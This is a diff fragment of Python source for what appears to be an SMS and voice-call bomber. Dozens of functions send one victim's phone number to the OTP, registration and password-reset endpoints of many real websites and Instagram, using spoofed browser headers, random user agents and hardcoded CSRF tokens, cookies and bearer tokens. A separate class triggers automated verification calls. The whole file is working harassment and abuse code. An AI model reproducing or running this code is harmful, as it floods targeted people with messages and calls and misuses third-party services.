+            post(url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def refahtea(phone):
+        n4 = f"action=refah_send_code&mobile=0{phone.split('+90')[1]}&security=c68b01b32a"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '61','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://refahtea.ir','referer': 'https://refahtea.ir/register/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def shahrhayejadid(phone):
+        n4 = f"mobile=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '18','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_gid=GA1.2.1080945716.1660661403; _ga_Q8S46CK37V=GS1.1.1660661403.1.1.1660662187.0; _gat_gtag_UA_148737608_1=1; _ga=GA1.1.702864792.1660661403; XSRF-TOKEN=eyJpdiI6IkFqaEZnMUZtRFFWa2txM09LUUc1WWc9PSIsInZhbHVlIjoiRTJIMnNaaThCZ3pSdC9FRi9kTWxZNUlJSUVEUnJRWFhXRUZJR2IwN0pFV2Y5cDlUNWNvV09YeUcwSWJVbEtQQlFOVE5iWittdlVrckxhSCtYTTFKdk9QZHh4SjdsQlJ4aXlNQWxFSFRnMzg0MkppVHIvcDNVdGNwckdjUVJiOXUiLCJtYWMiOiIyMWI5YWE4NDFhOTEzMGY3OWI2ZjRhMjk3MWVjYzRkZGEyZmU3ZjQwM2JkNjE4MjIxNzRiNmFiNTYyNjNhMDYyIn0%3D; shahrhayejadid_session=eyJpdiI6IjNmWElNV2tCM1dzY3VYRS8xYzdSc1E9PSIsInZhbHVlIjoiYW5FaGNJN2Rhb0M4MlQvT1V5a2gwY0IyYjlKS2tSY2tpc0xXNnZPbnV0bDRKK0Z2b0o5SGI0NHBIN2syU1F5c0k5Wjg4YVRqTFR1RXpCU3NrSG5FNFJPM3A1bVB6YUZQanNrS2Y0S1poK1piZWxkVUtZYmFqazR4eDhrM0tTdWQiLCJtYWMiOiJlMDkxNWMxODU3M2FkZWUwYTk1NzM1NmM5ZWFiMDZmNTdlMjRkNDZkYTRjNjBmZmFhODcxOTdmYTQ0OTc0MTAzIn0%3D','origin': 'https://shahrhayejadid.com','referer': 'https://shahrhayejadid.com/login','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-csrf-token': 'oREBtfHBdXTuDytkhWwjwSY4gtWHnCJEfbBmAaPN','x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def snapp_drivers(phone):
+        n4 = {'cellphone':'0'+phone.split('+90')[1]}
+        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
+        try: 
+            post(url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+    def mamifood(phone):
+        n4 = {'Phone':'0'+phone.split('+90')[1]}
+        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
+        try: 
+            post(url="https://mamifood.org/Registration.aspx/SendValidationCode",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def uphone(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://server.uphone.ir/api/v1/login/otp/request",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def abantether(phone):
+        n4 = {"phoneNumber":"0"+phone.split('+90')[1],"email":""}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://abantether.com/users/register/phone/send/",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def amoomilad(phone):
+        n4 = {"Token":"5c486f96df46520d1e4d4a990515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+phone.split('+90')[1],"Helper":77942}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+    def ashraafi(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={phone.split('+90')[1]}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={phone.split('+90')[1]}&dig_otp=&dig_nounce=54dfdabe34"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '203','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://ashraafi.com','referer': 'https://ashraafi.com/login-register/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+    
+        try: 
+            post(url="https://ashraafi.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+    def bandarazad(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '276','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://bandarazad.com','referer': 'https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://bandarazad.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def bazidone(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={phone.split('+90')[1]}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split('+90')[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '229','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://bazidone.com','referer': 'https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://bazidone.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def bigtoys(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&digregscode2=%2B90&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '351','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://www.bigtoys.ir','referer': 'https://www.bigtoys.ir/?login=true&back=home&page=1','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+    def bitex24(phone):
+        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','lang': 'null','origin': 'https://admin.bitex24.com','referer': 'https://admin.bitex24.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try:
+            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{phone.split('+90')[1]}&dial_code=0", headers=HEADER)
+        except:
+            pass
+
+            
+    def candoosms(phone):
+        n4 = f"action=send_sms&phone=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.candoosms.com','referer': 'https://www.candoosms.com/signup/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def farsgraphic(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo={phone.split('+90')[1]}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail={phone.split('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '413','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://farsgraphic.com','referer': 'https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def glite(phone):
+        n4 = f"action=logini_first&login=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.glite.ir','referer': 'https://www.glite.ir/user-login/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.glite.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def instagram(phone):
+        n4 = f"email_or_username=%2B{phone.split('+')[1]}&recaptcha_challenge_field=&flow=&app_id=&source_account_id="
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '93','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/password/reset/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-asbd-id': '198387','x-csrftoken': 'Rrz9lCCmwSAiSQmLsGwURFlco3sYs1Rm','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '315e7d00695c','x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.instagram.com/accounts/account_recovery_send_ajax/",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def hemat(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://shop.hemat-elec.ir','referer': 'https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def kodakamoz(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B90&mobmail2=&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '554','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.kodakamoz.com','referer': 'https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def mipersia(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&digregscode2=%2B90&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '277','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://www.mipersia.com','referer': 'https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def novinbook(phone):
+        n4 = f"phone=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def offch(phone):
+        n4 = {"username":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://api.offch.com/auth/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def sibbazar(phone):
+        liJ = {"username": "0"+phone.split('+90')[1]}
+        liU = "https://sandbox.sibbazar.com/api/v1/user/invite"
+        liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','content-length': ',26','origin': 'https://developer.sibbazar.com','referer': 'https://developer.sibbazar.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}
+        try:
+            post(url=liU, headers=liH, json=liJ)    
+            return True    
+        except:
+            pass
+
+            
+    def raminashop(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=d397aa3b0e&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A7%D8%AA%D8%B1%D8%AA%DB%8C%D8%A8%D8%A8&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=d397aa3b0e"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://raminashop.com','referer': 'https://raminashop.com/?login=true&page=1&redirect_to=https%3A%2F%2Framinashop.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://raminashop.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def sabziman(phone):
+        n4 = f"action=newphoneexist&phonenumber=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+            
+    def tajtehran(phone):
+        n4 = f"mobile=0{phone.split('+90')[1]}&password=mamad1234"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try:
+            post(url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+            
+    def zivanpet(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90','origin': 'https://zivanpet.com','referer': 'https://zivanpet.com/?login=true&page=1&redirect_to=https%3A%2F%2Fzivanpet.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+
+        try:
+            post(url="https://zivanpet.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+            
+            
+    def okala(phone):
+        n4 = {"mobile":"0"+ phone.split('+90')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
+        rhead = {'user-agent': generate_user_agent(os="win")}
+        try:
+            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
+            
+    def watchonline(phone):
+        n4 = {"mobile":"0"+ phone.split('+90')[1]}
+        rhead = {'Host': 'api.watchonline.shop','Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','Accept': 'application/json','Content-Type': 'application/json','Authorization': 'Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b','Origin': 'https://www.watchonline.shop','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.watchonline.shop/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
+        try:
+            post(url="https://api.watchonline.shop/api/v1/otp/request",json=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
+    def gharar(phone):
+        n4 = f"phone=0{phone.split('+90')[1]}"
+        rhead = {'content-length': '17','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG','sec-ch-ua-platform': 'Android','origin': 'https://gharar.ir','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://gharar.ir/','accept-encoding': 'gzip, deflate, br','accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
+        try:
+            post(url="https://gharar.ir/users/phone_number/",data=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
+class call:
+    def paklean_call(phone):
+        n4 = {"username": "0"+phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try:
+            post(url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
+            return True
+        except:
+            pass
+        
+    def novinbook_call(phone):
+        n4 = f"phone=0{phone.split('+90')[1]}&call=yes"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'} 
+        try:
+            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def azki_call(phone):
+        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'}
+        try:
+            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone.split('+90')[1]}", headers=HEADER)
+        except:
+            pass
+
+    def ragham_call(phone):
+        # Call and sms 
+        n4 = {"phone":phone}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
+            return True
+        except:
+            pass                
